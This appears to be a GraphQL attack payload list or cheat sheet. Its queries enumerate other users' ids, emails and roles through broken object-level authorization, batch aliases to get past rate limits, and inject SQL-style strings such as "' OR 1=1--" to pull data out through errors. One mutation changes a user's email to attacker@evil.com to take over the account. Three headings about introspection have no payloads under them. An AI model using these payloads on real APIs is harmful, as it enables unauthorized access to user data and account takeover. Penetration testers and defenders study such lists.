# Full introspection dump

# Mutation introspection

# BOLA via GraphQL
query{user(id:"1"){id,name,email,role}}
query{user(id:"2"){id,name,email,role}}
query{users{edges{node{id,name,email,role}}}}

# Alias batching (rate limit bypass)
query{a1:user(id:"1"){email}a2:user(id:"2"){email}a3:user(id:"3"){email}}

# Mutation abuse - change email (ATO)
mutation{updateUser(input:{id:"1",email:"attacker@evil.com"}){id,email}}

# Introspection bypass (when disabled)

# Error-based extraction
query{user(id:"1 OR 1=1"){id,name}}
query{user(id:"' OR 1=1--"){id,name}}
